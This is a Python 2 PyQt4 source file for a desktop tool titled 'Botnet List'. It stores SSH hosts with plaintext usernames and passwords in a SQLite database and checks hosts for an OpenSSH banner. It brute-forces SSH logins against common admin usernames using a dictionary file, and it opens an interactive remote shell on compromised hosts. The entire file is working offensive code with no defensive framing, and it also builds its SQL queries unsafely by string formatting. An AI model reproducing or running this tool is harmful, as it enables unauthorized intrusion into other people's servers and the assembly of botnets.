# -*- coding: utf-8 -*-

from PyQt4 import QtGui, QtCore
import sys, socket, sqlite3, pxssh, crypt, random, subprocess, time

try:
  _fromUtf8= QtCore.QString.fromUtf8
except AttributeError:
  def _fromUtf8(s):
    return s


class Formulario(QtGui.QWidget):
	
	def __init__(self, parent=None):

		QtGui.QWidget.__init__(self, parent)
		self.port=22
		self.botnetDB="botnetdb.db"
		self.iniciar()
	

	def iniciar(self):
		
		self.labelhost=QtGui.QLabel(self)
		self.labeluser=QtGui.QLabel(self)
		self.labelpassword=QtGui.QLabel(self)
		self.labeltitulo=QtGui.QLabel(self)
		self.hostt=QtGui.QLineEdit(self)
		self.userr=QtGui.QLineEdit(self)
		self.passwordd=QtGui.QLineEdit(self)
		self.passwordd.setEchoMode(QtGui.QLineEdit.Password)
		
		self.boton1=QtGui.QPushButton(self)
		self.boton2=QtGui.QPushButton(self)
		#self.boton3=QtGui.QPushButton(self)
		#self.boton4=QtGui.QPushButton(self)
		
		
		self.labelhost.setText("Host: ")
		self.labeluser.setText("User: ")
		self.labelpassword.setText("Password: ")
		self.boton1.setText("Aniadir")
		self.boton2.setText("Reset")
		#self.boton3.setText("Almacen")
		#self.boton4.setText("Comprobar host")
		
		self.labelhost.move(10, 10)
		self.labeluser.move(10, 40)
		self.labelpassword.move(10, 70)
		self.hostt.move(80, 10)
		self.userr.move(80, 40)
		self.passwordd.move(80, 70)
		self.boton1.move(15, 105)
		self.boton2.move(125, 105)
		#self.boton3.move(120, 160)
		#self.boton4.move(120, 190)

		self.hostt.resize(150,25)
		self.userr.resize(150,25)
		self.passwordd.resize(150,25)
		
		self.boton1.resize(100, 40)
		self.boton2.resize(100, 40)
		self.connect(self.passwordd, QtCore.SIGNAL("returnPressed()"), self.aniadirBotnet)
		self.boton1.clicked.connect(self.aniadirBotnet)
		self.boton2.clicked.connect(self.reset)
		#self.boton3.clicked.connect(self.verBotnets)
		#self.boton4.clicked.connect(self.checkHost)

		self.setWindowTitle("Form Botnet")
		self.setGeometry(500, 350, 240, 150)
		self.setFixedSize(240, 150)

	
	def recogerBotnet(self):
	
		self.generateID()
		self.host=str(self.hostt.text())
		self.user=str(self.userr.text())
		self.password=str(self.passwordd.text())
		inventary.guardarHostFile()
		self.close()
		

	def generateID(self):

		cuenta.generarID()
		self.IDgenerated=cuenta.IDgenerated


	def aniadirBotnet(self):
	
		self.recogerBotnet()
		self.conexion=sqlite3.connect(self.botnetDB)
		self.cursor=self.conexion.cursor()
		query="INSERT INTO botnet VALUES (%s, '%s', '%s', '%s')" % (self.IDgenerated, self.host, self.user, self.password)
		self.cursor.execute(query)
		self.conexion.commit()
		self.reset()
		inventary.getIt()
	

	def reset(self):

		self.hostt.setText("")
		self.userr.setText("")
		self.passwordd.setText("")
		

	#def verBotnets(self):

	#	inventary.show()
			

	def keyPressEvent(self, e):

		if e.key() == QtCore.Qt.Key_Escape:
			self.close()

	#	elif e.key() == QtCore.Qt.Key_V:
	#		self.verBotnets()


	def lookfile(self):
		
		self.file = QtGui.QFileDialog.getOpenFileName(self, 'Buscar Archivo', '')
		f=open(self.file, "rb+")
		todo=f.read()
		f.close()


class AlmacenBotnets(QtGui.QWidget):

	def __init__(self):

		super(AlmacenBotnets, self).__init__()

		self.botnetDB="botnetdb.db"
		self.defaultDicFile= "dic.txt"
		self.found= "NOT Bruted"
		self.superDictionary= []
		self.step=0
		#self.timer=QtCore.QBasicTimer()
		self.iniciar()
			

	def iniciar(self):

		self.HostsCheckedsOn=""
		self.HostsCheckedsOff= ""
		grid=QtGui.QGridLayout(self)
		self.barraProgress=QtGui.QProgressBar(self)
		self.treeWidget=QtGui.QTreeWidget(self)
		self.treeWidget.header().setDefaultSectionSize(150)
		#self.label=QtGui.QLabel(self)
		self.boton1=QtGui.QPushButton(self)
		self.boton2=QtGui.QPushButton(self)
		self.boton3=QtGui.QPushButton(self)
		self.boton4=QtGui.QPushButton(self)
		self.boton5=QtGui.QPushButton(self)
		self.boton6=QtGui.QPushButton(self)
		self.boton7=QtGui.QPushButton(self)
		#self.label.setText("Botnets:")
		self.boton1.setText("exec Shell")
		self.boton2.setText("Add Botnet")
		self.boton3.setText("Delete Botnet")
		self.boton4.setText("Check Host")
		self.boton5.setText("Brute Force")
		self.boton6.setText("Add Dictionary")
		self.boton7.setText("AutoCheck")
		self.treeWidget.headerItem().setText(0, "Id")
		self.treeWidget.headerItem().setText(1, "Host")
		self.treeWidget.headerItem().setText(2, "Username")
		self.treeWidget.headerItem().setText(3, "Password")
		_sortingEnabled=self.treeWidget.isSortingEnabled()
		self.treeWidget.setSortingEnabled(False)

		#grid.addWidget(self.label, 0, 0)
		grid.addWidget(self.treeWidget, 1, 0, 1, 6)
		grid.addWidget(self.boton1, 0, 0, 1, 1)
		grid.addWidget(self.boton2, 0, 1, 1, 1)
		grid.addWidget(self.boton3, 0, 2, 1, 1)
		grid.addWidget(self.boton4, 0, 3, 1, 1)
		grid.addWidget(self.boton5, 0, 4, 1, 1)
		grid.addWidget(self.boton6, 0, 5, 1, 1)
		grid.addWidget(self.boton7, 2, 0, 1, 1)
		grid.addWidget(self.barraProgress, 2, 1, 1, 6)
		
		self.setLayout(grid)
		self.boton1.clicked.connect(self.remoteShell)
		self.boton2.clicked.connect(self.aniadirBotnet)
		self.boton3.clicked.connect(self.eliminarBotnet)
		self.boton4.clicked.connect(self.checkingHost)
		self.boton5.clicked.connect(self.brutingForce)
		self.boton6.clicked.connect(self.diccionarioImplementar)
		self.boton7.clicked.connect(self.checkHostListed)
		self.connect(self.treeWidget, QtCore.SIGNAL("itemPressed(QTreeWidgetItem*, int)"), self.dale)
		self.conexion=sqlite3.connect(self.botnetDB)
		self.nave=self.conexion.cursor()
	
		try:
			self.nave.execute("CREATE TABLE botnet (id int, host text, user text, pwd text)")	
			self.nave.execute("INSERT INTO botnet VALUES( 0, '192.168.1.1', 'root', 'toor')")
			self.conexion.commit()
		except:
			pass

		self.treeWidget.setSortingEnabled(_sortingEnabled)
		
		self.setWindowIcon(QtGui.QIcon("deadmouseblack2.png"))
		self.setWindowTitle("Botnet List v. 0")	
		self.setFixedSize(650,700)
		self.setGeometry(300,900, 700, 700)
		self.getIt()
	
	
	def timerEvent(self):
	
		while self.step <= 99:
			self.step = self.step + 1
			self.barraProgress.setValue(self.step)
	
			
	def encryptPass(self, passw):
		
		rand=""
		letras="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwyz"
		for letra in range(0,2):
			rand += random.choice(letras)
		self.cryptPassword= crypt.crypt(passw, rand)
		return self.cryptPassword


	def getIt(self):

		self.treeWidget.clear()
		iconON=QtGui.QIcon("deadmousegreen.png")
		iconOFF=QtGui.QIcon("Red.png")
		iconNorm=QtGui.QIcon("deadmouseblue.png")
		self.hosts= ""
		self.font= QtGui.QFont("SansSerif", 14, True)
      		self.font.setPixelSize(15)
		try:
			self.treeWidget.clear()
			self.nave.execute("SELECT * FROM botnet")
			l = 0
			for row in self.nave:
				item_0=QtGui.QTreeWidgetItem(self.treeWidget)
				Id, host, user,pwd= row
				self.hosts += host+" "
				if str(host) in self.HostsCheckedsOff:
					item_0.setTextColor(0, QtCore.Qt.red)
					item_0.setTextColor(1, QtCore.Qt.red)
					item_0.setIcon(1, iconOFF)
					item_0.setTextColor(2, QtCore.Qt.red)
					item_0.setTextColor(3, QtCore.Qt.red)
				elif host in self.HostsCheckedsOn:
					item_0.setTextColor(0, QtCore.Qt.green)
					item_0.setTextColor(1, QtCore.Qt.green)
					item_0.setIcon(1, iconON)
					item_0.setTextColor(2, QtCore.Qt.green)
					item_0.setTextColor(3, QtCore.Qt.green)
				else:
					item_0.setTextColor(0, QtCore.Qt.blue)
					item_0.setTextColor(1, QtCore.Qt.blue)
					item_0.setIcon(1, iconNorm)
					item_0.setTextColor(2, QtCore.Qt.blue)
					item_0.setTextColor(3, QtCore.Qt.blue)
	
				self.treeWidget.setFont(self.font)
				self.treeWidget.topLevelItem(l).setText(0, str(Id))
				self.treeWidget.topLevelItem(l).setText(1, host)
				self.treeWidget.topLevelItem(l).setText(2, user)
				print pwd
				self.treeWidget.topLevelItem(l).setText(3, str(self.encryptPass(pwd)))
				l = l + 1
			self.conexion.commit()
			self.conexion.close()
			self.guardarHostFile()

		except:
			self.conexion=sqlite3.connect(self.botnetDB)
			self.nave=self.conexion.cursor()
			self.getIt()


	def dale(self, qt, i):

		self.ITEMseleccionado=self.treeWidget.currentItem()
		# ip=self.ITEMseleccionado.text(1)

	def checkHostListed(self):

		
		self.readHostFile()


	def guardarHostFile(self):
		
		f=open("HOSTs.txt", "w")
		f.write(self.hosts)
		f.close()
		
			

	def readHostFile(self):
		
		self.timerEvent()
		f=open("HOSTs.txt", "rb")
		Hosts= f.read()
		f.close()
		self.hostCheckeds= Hosts
		Hosts= Hosts.split()
		for host in Hosts:
			self.scanned=CheckHost(host)
			self.scanHostListed()

		print "[+] ON : "+self.HostsCheckedsOn	
		print "[-] OFF : "+self.HostsCheckedsOff
		self.step= 100
		self.barraProgress.setValue(self.step)
		self.getIt()
		self.HostsCheckedsOn=""
		self.HostsCheckedsOff= ""
		QtGui.QMessageBox.about(self, "Checked", " Successfully Checked")
		self.step = 0
		self.barraProgress.setValue(self.step)
		
	
	def scanHostListed(self):

		# some idea to plug it
		scannedResults=self.scanned.scanResult
		on="OpenSSH activated"
		if on == scannedResults:
			self.HostsCheckedsOn += self.scanned.host+" "
		else:
			self.HostsCheckedsOff += self.scanned.host+" "
		
		
		

	def diccionarioImplementar(self):
		
		try:
			diccionario = QtGui.QFileDialog.getOpenFileName(self, 'Find out', '')
			f=open(diccionario, "rb")
			boceto=f.read()
			f.close()
			boceto=boceto.strip("[,]")
			self.dicImplementing=boceto.split()
			self.addDictoSuperDic()
			QtGui.QMessageBox.about(self, "Confirmation", "Dictionary added succesfully")
		except IOError:
			pass

	def readDefaultDic(self):
	
		f=open(self.defaultDicFile, "rb")
		self.defaultDic=f.read()
		f.close()
		self.defaultDic= self.defaultDic.split()
	

	def writeDefaultDic(self):

		f=open(self.defaultDicFile, "a+")
		for word in self.superDictionary:
			f.write("\n"+word)
		f.close()


	def addDictoSuperDic(self):

		for word in self.dicImplementing:
			self.superDictionary.append(word)
		self.writeDefaultDic()
		

	def bruting(self, hosting, usuario, word):
		
		
		sessionSSH=pxssh.pxssh()
		reply=sessionSSH.login(hosting, usuario, word)
		if reply == True:
			self.found = "Bruted"

			
	def brutingForce(self):
		
		try:
			found = "Bruted"
			hosting, ok= QtGui.QInputDialog.getText(self, "to make Brute Force", "Host:                                                   ")	
			if ok:
				user=["root", "r00t", "admin", "administrator", "administrador", "user"]
				self.readDefaultDic()
				
				for usuario in user:
					for word in self.defaultDic:
						self.timerEvent()
						print "[+] Checking with user: "+usuario+", password: "+word
						self.bruting(hosting, usuario, word)
						if self.found == found:
							self.step=100
							self.barraProgress.setValues(self.step)
							QtGui.QMessageBox.about(self, "Bruted HOST: "+hosting, "+ Password found : "+word+", with user: "+usuario)
							self.step=0
							self.barraProgress.setValue(self.step)
							break
					if self.found == found:
						break
		
				if self.found != found:
					self.step= 100
					self.barraProgress.setValue(self.step)
					QtGui.QMessageBox.about(self, "Alert", "Password NOT found")
					self.step=0
					self.barraProgress.setValue(self.step)

		except:
				
			pass

	def aniadirBotnet(self):

		form.show()
		

	def checkingHost(self):

		
		hostToCheck, ok=QtGui.QInputDialog.getText(self, "Check the port 22 (OpenSSH)", "Host:                                                                  ")
		if ok:
			self.timerEvent()
			scanning=CheckHost(str(hostToCheck))
			self.step=100
			self.barraProgress.setValue(self.step)
			QtGui.QMessageBox.about(self, "Scanned IP: "+str(hostToCheck), "Reason: "+str(scanning.scanResult))
			self.step=0
			self.barraProgress.setValue(self.step)


	def keyPressEvent(self, e):

		if e.key() == QtCore.Qt.Key_Escape:
			self.close()
		elif e.key() == QtCore.Qt.Key_E:
			self.remoteShell()
		elif e.key() == QtCore.Qt.Key_N:
			self.aniadirBotnet()
		elif e.key() == QtCore.Qt.Key_D:
			self.eliminarBotnet()
		elif e.key() == QtCore.Qt.Key_C:
			self.checkingHost()
		elif e.key() == QtCore.Qt.Key_B:
			self.brutingForce()
		elif e.key() == QtCore.Qt.Key_A:
			self.diccionarioImplementar()
		
	

	def eliminarBotnet(self):

		try:
			self.conexion=sqlite3.connect(self.botnetDB)
			self.nave=self.conexion.cursor()
		except:
			pass

		idToDelete, ok = QtGui.QInputDialog.getText(self, "Eliminar Botnet", "Introduce ID")
		if ok:
			self.timerEvent()
			self.nave.execute("SELECT * FROM botnet where id=%s" % idToDelete)	
			row=self.nave.fetchone()
			ID, HOST, USER, pwBD = row
			self.conexion.commit()
			passwordToDelete, ok2 = QtGui.QInputDialog.getText(self, "Eliminar Botnet", "Password's Host", QtGui.QLineEdit.Password)
			if passwordToDelete == pwBD:
				if ok2:
					self.nave.execute("DELETE FROM botnet WHERE id=%s" % idToDelete)
					cuenta.eliminarID()
					self.conexion.commit()
					self.conexion.close()
					self.step=100
					self.barraProgress.setValue(self.step)
					QtGui.QMessageBox.about(self, "Confirmation", "Deleted Botnet succesfully")
					self.step=0
					self.barraProgress.setValue(self.step)
					self.getIt()
				else:
					self.step=0
					self.barraProgress.setValue(self.step)
			else:
				QtGui.QMessageBox.about(self, "Alerta", "Necesita el password de la conexion SSH")
				self.step=0
				self.barraProgress.setValue(self.step)
	

	def remoteShell(self):
		try:
			self.conexion=sqlite3.connect(self.botnetDB)
			self.nave=self.conexion.cursor()
		except:
			pass
		hostToShell, ok = QtGui.QInputDialog.getText(self, "Remote shell", "Id to Execute Remote Shell with OpenSSH")
		if ok:
			self.timerEvent()
			self.nave.execute("SELECT * FROM botnet where id=%s" % hostToShell)

			row=self.nave.fetchone()
			self.ID, self.HOST, self.USER, self.PWD= row
			QtGui.QMessageBox.about(self,  "Executing", "On address: "+self.HOST)
			try:
				self.step=100
				self.barraProgress.setValue(self.step)
				shelling.conectarse()
				shelling.show()
				self.step=0
				self.barraProgress.setValue(self.step)
			
			
			except:
				QtGui.QMessageBox.about(self, "Error", "[-] Error Connecting on address: "+self.HOST)
			
			
			
		
			
# fix it	
class Shell(QtGui.QWidget):
	
	def __init__(self):
		
		self.buffer = ""
		super(Shell, self).__init__()
		self.IP= ""
		self.iniciar()


	def iniciar(self):
		
		label1=QtGui.QLabel(self)
		self.bufferlinea=QtGui.QTextEdit(self)
		self.lineainput=QtGui.QLineEdit(self)
		self.botonenviar=QtGui.QPushButton(self)

		label1.setText("Remote Shell")
		self.botonenviar.setText("Send")

		label1.move(0, 10)
		self.bufferlinea.move(0, 40)
		self.bufferlinea.resize(500,200)
		self.lineainput.move(0, 250)
		self.lineainput.resize(440,20)
		self.botonenviar.move(450, 250)
		self.botonenviar.resize(50,20)
	
		self.connect(self.lineainput, QtCore.SIGNAL("returnPressed()"), self.enviarCmd)
		self.botonenviar.clicked.connect(self.enviarCmd)

		self.setWindowTitle("shell shh FROM: ")
		self.setGeometry(300,300,500,280)
		self.setFixedSize(500,280)


	def conectarse(self):

		sesion.recogerData()
		self.IP= sesion.host
		self.setWindowTitle("shell shh FROM: "+self.IP)
		sesion.iniciar()
		

	def enviarCmd(self):
		
		self.recogerCmd()
		sesion.looping(self.cmdToSend)
		self.catchBuffer()
		self.showBuffer()

	def recogerCmd(self):

		try:
			self.cmdToSend=_fromUtf8(self.lineainput.text())
			self.lineainput.setText("")
		except:
			QtGui.QMessageBox.about(self, "Alerta", "Some error typing the CMD")
			

	def catchBuffer(self):

		self.got = sesion.data
		self.buffer += "\n\n"+self.got
		

	def showBuffer(self):
		
		self.bufferlinea.setText(self.buffer)


	def keyPressEvent(self, e):
		
		if e.key() == QtCore.Qt.Key_Escape:
			sesion.fuimonos()
			self.close()
#fix it

class Session():

	def __init__(self):

		self.session=pxssh.pxssh()
		
		


	def iniciar(self):

		self.session.login(self.host, self.user, self.pwd)
		return self.session
		

	def looping(self, cmd):

		self.cmd=cmd
		self.session.sendline(cmd)
		self.session.prompt()
		self.data=self.session.before


	def fuimonos(self):

		self.session.logout()
		self.session.close(force=True)

	
	def recogerData(self):

		self.host=inventary.HOST
		self.user=inventary.USER
		self.pwd=inventary.PWD


class CheckHost():
	

	def __init__(self, host):
		try:
			self.scanResult=""
			self.ErrorCheckHost= ""
			self.host= host
			sesion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sesion.connect((host,22))
			resultado=sesion.recv(4096)
			ok="SSH-2.0-OpenSSH_6.1\r\n"
			if resultado == ok:
				self.scanResult= "OpenSSH activated"
			else:
				self.scanResult= "OpenSSH deactivted"
		except Exception, e:
			self.scanResult="Refused Connection"
			self.ErrorCheckHost = e


class ContadorID():
	

	def __init__(self):

		self.fileId="BufferDBotnet.txt"
		self.leerFileId()
	

	def leerFileId(self):

		try:

			f=open(self.fileId, "rb")
			contador=f.read()
			f.close()
			self.IDgenerated= int(contador)

		except IOError:

			self.IDgenerated= 0
			self.procesar("w+")
			self.leerFileId()


	def aniadirID(self):

		self.leerFileId()
		self.IDgenerated= self.IDgenerated + 1
		self.procesar("w")
		
	def eliminarID(self):
		self.leerFileId()
		self.IDgenerated= self.IDgenerated - 1
		self.procesar("w")


	def procesar(self, att):
		f=open(self.fileId, att)
		f.write(str(self.IDgenerated))
		f.close()
	

	def generarID(self):
		self.aniadirID()
		self.leerFileId()


############################ EXECUTING CLASS's #############################



app=QtGui.QApplication(sys.argv)

form=Formulario()
inventary=AlmacenBotnets()
sesion=Session()
inventary.show()
shelling=Shell()
cuenta=ContadorID()


sys.exit(app.exec_())

# // m6
